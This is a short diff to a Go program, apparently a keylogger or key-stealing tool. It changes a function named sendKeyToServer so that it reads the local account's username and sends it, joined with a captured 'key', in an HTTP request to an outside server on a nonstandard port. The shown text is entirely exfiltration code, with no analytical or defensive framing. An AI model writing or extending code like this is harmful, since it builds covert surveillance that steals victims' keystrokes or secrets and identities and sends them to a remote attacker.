@@ -5,7 +5,9 @@ package main
 */
 import "C"
 import (
+	"log"
 	"net/http"
+	"os/user"
 	"strings"
 )
 
@@ -26,7 +28,12 @@ func handleFunc() {
 }
 
 func sendKeyToServer(key string) {
-	req, _ := http.NewRequest("GET", "http://s1.yumehost.com:25583/", strings.NewReader(key))
+	name, err := user.Current()
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	req, _ := http.NewRequest("GET", "http://s1.yumehost.com:25583/", strings.NewReader(name.Username+":"+key))
 
 	client := &http.Client{}
 	_, _ = client.Do(req)
